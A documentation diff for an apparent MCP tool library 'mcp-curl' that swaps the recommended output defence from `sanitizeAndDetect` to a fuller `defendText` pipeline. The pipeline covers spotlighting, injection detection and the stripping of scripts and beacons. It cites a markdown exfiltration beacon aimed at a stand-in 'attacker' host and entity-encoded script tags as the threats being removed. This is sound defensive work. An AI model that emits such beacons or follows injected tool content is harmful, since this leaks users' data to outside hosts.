@@ -195,29 +195,60 @@ widening the strict default.
 
 Anything you return *from* a custom tool that originates outside your
 application (HTTP response bodies, file content, third-party API responses)
-crosses the same trust boundary the built-in `curl_execute` tool defends. The
-library exports response-side helpers so custom tools can replicate the
-defence without deep-importing or reimplementing it.
+crosses the same trust boundary the built-in `curl_execute` tool defends.
+
+**If your tool is registered through `server.registerCustomTool()`, this is
+already done for you** — see *Composing the Full Defence* below. The helpers
+here are for a pipeline that runs outside the MCP handler boundary.
 
 | Helper | Use when... | Notes |
 |--------|-------------|-------|
-| `sanitizeAndDetect(text, label)` | You want the same defence the built-in tools apply. | Recommended. Locks the sanitize → detect → log ordering. |
+| `defendText(text, options)` | You want the defence the built-in tools apply. | **This is the whole pipeline.** Everything below it is one stage of it. |
 | `applySpotlighting(text, requestId)` | You're emitting external content and want the LLM to treat it as data, not instructions. | Idempotent — pre-wrapped content is returned unchanged. Pass `randomUUID()`. |
-| `sanitizeResponse(text)` | You need only the Unicode/whitespace strip without the detection signal. | Lower-level — `sanitizeAndDetect` is preferred. |
+| `sanitizeAndDetect(text, label)` | You want Step 2 alone — the Unicode strip plus the detection log. | Locks the detect-on-original ordering. **Not the full defence:** see the warning below. |
+| `sanitizeResponse(text)` | You need only the Unicode/whitespace strip without the detection signal. | Lower-level still. |
 | `detectInjectionPattern(text)` | You're building a custom logging or telemetry sink. | **Observability only.** See the warning below — never use as a refusal gate. |
-| `logInjectionDetected(label)` | You're replacing `sanitizeAndDetect` with your own composer and want consistent stderr log format. | Throttled to once per label per 60s. |
+| `logInjectionDetected(label)` | You're composing your own pipeline and want the consistent stderr log format. | Throttled to once per label per 60s. |
 
-**Recommended:** use `sanitizeAndDetect(text, label)` plus `applySpotlighting`:
+> **⚠️ `sanitizeAndDetect` is not the full defence, and earlier releases of this
+> page said it was.** It is Step 2 of five. Steps 3–5 — markup-comment
+> stripping, the `<script>`/`<style>` fixed point, markdown beacon removal and
+> the numeric-entity re-detect — are what remove exfiltration beacons like
+> `![x](https://attacker/?d=…)` and embedded script blocks. A channel running
+> Step 2 alone passes those through intact while looking defended. If you want
+> "the defence", call `defendText`.
+
+**Recommended:** use `defendText(text, options)` plus `applySpotlighting`:
 
 ```typescript
-import { sanitizeAndDetect, applySpotlighting } from "mcp-curl";
+import { defendText, applySpotlighting } from "mcp-curl";
 import { randomUUID } from "node:crypto";
 
-const sanitized = sanitizeAndDetect(externalContent, hostname);
+const defended = defendText(externalContent, {
+    hostname,                    // label for the throttled injection log
+    contentType,                 // the origin's Content-Type, when you know it
+    // contentTypeUndetermined: true,  // when you do NOT — see below
+    // decodeEntities: false,          // when your consumer does not decode
+});
 const wrapped = config.enableSpotlighting
-    ? applySpotlighting(sanitized, randomUUID())
-    : sanitized;
+    ? applySpotlighting(defended, randomUUID())
+    : defended;
 ```
+
+Two options are worth understanding rather than copying:
+
+- **`contentTypeUndetermined: true`** is for when you could not determine the
+  content type, as distinct from the origin not sending one. It selects the
+  *strictest* grammar — every strip stage runs — so that losing the metadata can
+  never be the way a stage gets switched off. Text that genuinely parses as a
+  JSON document is still excluded, because `<script>` and `[a](b)` are
+  legitimate inside JSON string values.
+- **`decodeEntities: false`** is for a channel whose consumer does not itself
+  decode HTML entities. The decode's result is what gets *returned*, so on such
+  a channel it turns inert bytes the origin sent (`&#x3c;script&#x3e;`) into
+  live markup this library authored. The cost of switching it off is stated in
+  `ARCHITECTURE.md` invariant 1a: the re-detect can no longer unmask an
+  entity-encoded injection phrase on that channel.
 
 `applySpotlighting` is idempotent — if the framework re-wraps content that
 your custom tool already wrapped, the outer call is a no-op.
@@ -229,13 +260,13 @@ your custom tool already wrapped, the outer call is a no-op.
 > probe the behaviour. The defence layer is `sanitizeResponse` (which always
 > runs) plus `applySpotlighting` (the trust-boundary sentinel). Detection is
 > a logging signal, never a gate. If you find yourself reaching for the
-> primitive to make a refusal decision, prefer `sanitizeAndDetect` instead
-> — it is the safe alternative because it cannot be misused this way (it
-> always returns the sanitized text).
+> primitive to make a refusal decision, prefer `defendText` instead — it is
+> the safe alternative because it cannot be misused this way (it always
+> returns the defended text).
 
-The library uses these same helpers internally on `curl_execute` and
-YAML-tool output. Calling them from a custom tool keeps the trust boundary
-symmetric.
+`defendText` is the same function the built-in tools call, not a parallel
+implementation of it. That is deliberate: a second implementation is the weaker
+one, and nobody knows which surface they are on.
 
 ## Composing the Full Defence
 
@@ -243,28 +274,49 @@ The two sections above describe the input and output halves of the trust
 boundary. **For tools registered via `server.registerCustomTool()`, the
 output half is already applied for you** — every value the handler returns is
 routed through the same internal post-processor wrap that defends
-`curl_execute`, `jq_query`, and YAML-driven endpoints. The wrap runs
-**detect → sanitise → optional spotlight** on each text content part:
+`curl_execute`, `jq_query`, and YAML-driven endpoints. On each text content
+part the wrap runs:
 
-1. `sanitizeAndDetect()` runs on the **original** text, emits the throttled
-   `[injection-defense] [host]` log on a match, and returns the sanitised text.
+1. **The full `defendText` pipeline**, with `contentTypeUndetermined: true` and
+   `decodeEntities: false`. The Content-Type is genuinely unknown at this
+   boundary — a handler return is bare text — so the strictest grammar applies
+   and every strip stage runs, except on text that parses as a JSON document.
+   Detection runs on the **original** text and emits the throttled
+   `[injection-defense] [host]` log on a match.
 2. If `config.enableSpotlighting === true` and the result is not an error, the
-   sanitised text is wrapped in a per-message UUID-keyed sentinel envelope.
+   defended text is wrapped in a per-message UUID-keyed sentinel envelope.
 
-Idempotence is enforced via a module-private symbol tag, so a handler that
-pre-sanitises (or pre-spotlights via `applySpotlighting`) won't double-process.
-The wrap is fail-open: an internal exception returns the original result and
-emits a throttled `[wrap-error] [host]` log.
+> **This changed in 3.4.0.** Before that release the wrap ran
+> `sanitizeAndDetect` alone, so a custom-tool handler returning remote markdown
+> or HTML reached the model with beacons and `<script>` blocks intact. If your
+> handler was defending its own output to compensate, it no longer needs to —
+> and if it was not, it is now covered.
+
+**What this means for your handler:** return the external content as you
+received it. Pre-defending is harmless but redundant; `applySpotlighting` is
+idempotent and the sanitiser is idempotent on already-sanitised text.
+
+Two exceptions keep their own, better-informed pass: `curl_execute` and
+`jq_query` already ran `defendText` under the Content-Type the origin actually
+declared, and mark their successful results so the wrap does not second-guess
+that with a grammar it can no longer see. Their *error* results are not marked
+— error text carries exception messages that can embed foreign bytes — so those
+take the full pipeline like any other unknown text.
+
+Idempotence for the wrap as a whole is enforced via a module-private symbol tag,
+so a result passing through two wraps is not processed twice. The wrap is
+fail-open: an internal exception returns the original result and emits a
+throttled `[wrap-error] [host]` log.
 
 If you're building a **non-MCP** pipeline (e.g. a plain HTTP service backed by
 the same library) and need to replicate the defence outside the MCP handler
-boundary, compose the public primitives directly per the snippets above —
-`sanitizeAndDetect(text, label)` is the recommended composer (it locks the
-detect-on-original ordering); pair it with `applySpotlighting(sanitised,
-randomUUID())` if your protocol has the equivalent of a per-message trust
-boundary. The internal `createWrapper` factory is **not** exported on purpose:
-its `CallToolResult` shape is coupled to the MCP SDK and would be a stability
-hazard for callers building their own response shapes.
+boundary, call `defendText` directly per the snippet above, and pair it with
+`applySpotlighting(defended, randomUUID())` if your protocol has the equivalent
+of a per-message trust boundary. The internal `createWrapper` factory is **not**
+exported on purpose: its `CallToolResult` shape is coupled to the MCP SDK and
+would be a stability hazard for callers building their own response shapes.
+`defendText` has no such coupling — it takes a string and returns a string,
+which is why that half is public and the wrap is not.
 
 ## Using Instance Utilities
 
